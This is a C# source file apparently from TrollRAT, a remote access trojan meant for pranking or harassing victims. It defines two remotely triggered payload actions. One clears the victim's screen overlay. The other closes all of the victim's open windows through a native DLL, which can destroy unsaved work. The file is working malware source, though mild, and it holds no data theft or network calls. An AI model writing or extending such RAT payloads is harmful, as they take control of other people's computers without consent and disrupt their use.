using System;
using System.Runtime.InteropServices;
using TrollRAT.Payloads;
using TrollRATPayloads.Utils;

namespace TrollRATPayloads.Actions
{
    public class PayloadActionClearScreen : SimplePayloadAction
    {
        public PayloadActionClearScreen(Payload payload) : base(payload) { }

        [DllImport("user32.dll")]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, int flags);

        public override string execute()
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133);

            OverlayWindow.OverlayGrahpics.Clear(System.Drawing.Color.Transparent);
            OverlayWindow.updateOverlay();

            return "void(0);";
        }

        public override string Icon => null;
        public override string Title => "Clear Screen";
    }

    public class PayloadActionClearWindows : SimplePayloadAction
    {
        public PayloadActionClearWindows(Payload payload) : base(payload) { }

        [DllImport("TrollRATNative.dll")]
        static extern void clearWindows();

        public override string execute()
        {
            clearWindows();
            return "void(0);";
        }

        public override string Icon => null;
        public override string Title => "Close open Windows";
    }
}
